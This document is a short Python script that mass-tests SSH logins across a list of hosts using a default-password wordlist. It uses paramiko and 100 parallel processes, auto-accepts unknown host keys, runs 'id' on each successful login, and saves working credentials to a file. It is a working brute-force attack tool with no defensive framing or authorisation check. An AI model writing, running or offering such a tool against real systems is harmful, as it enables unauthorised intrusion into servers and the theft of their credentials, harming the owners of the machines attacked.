import paramiko
import multiprocessing as mp

sshList = open('ssh-betterdefaultpasslist.txt', 'r').read().splitlines()

def loginSsh(hostname):
    if '://' in hostname:
        hostname = hostname.split('/')[2]
    elif hostname.endswith('/'):
        hostname = hostname[:-1]
    else:
        pass
    for ssh in sshList:
        username, password = ssh.split(':')
        try:
            sshFormat = 'ssh://{}:{}@{}:22'.format(username, password, hostname)
            sshConn = paramiko.SSHClient()
            sshConn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sshConn.connect(hostname, username=username, password=password)
            sshConn.exec_command('id')
            print('[+] Login Success: ' + hostname + ' ' + username + ' ' + password)
            with open('ssh-creds.txt', 'a') as f:
                f.write(sshFormat + '\n')
            sshConn.close()
            break
        except Exception:
            print('[-] Login Failed: ' + hostname + ' ' + username + ' ' + password, end='\r')
    print()

def main():
    lists_url = open(input('Enter the file name: '), 'r').read().splitlines()
    pool = mp.Pool(100)
    pool.map(loginSsh, lists_url)
    pool.close()
    pool.join()

if __name__ == '__main__':
    main()